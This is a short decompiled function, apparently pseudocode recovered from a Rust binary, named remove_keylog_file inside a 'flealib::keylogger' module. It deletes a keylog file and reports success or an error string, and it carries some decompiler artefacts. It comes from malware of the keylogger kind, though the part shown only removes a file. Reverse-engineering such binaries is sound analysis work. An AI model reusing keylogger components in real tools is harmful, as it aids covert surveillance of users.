long long flealib::keylogger::remove_keylog_file(unsigned long long a0, unsigned long long a1)
{
    unsigned long long v0;  // [bp-0x10]
    unsigned long long v2;  // rax

    v2 = std::fs::remove_file(a1);
    if (v2)
    {
        v0 = v2;
        a0.spec_to_string(&v0);
        ::0x7a1b60::core::ptr::drop_in_place<std::io::error::Error>(&v0);
    }
    else
    {
        a0.to_vec("Ok%Y-%m-%d %H:%M:%S[]\n", 2);
    }
    return a0;
}
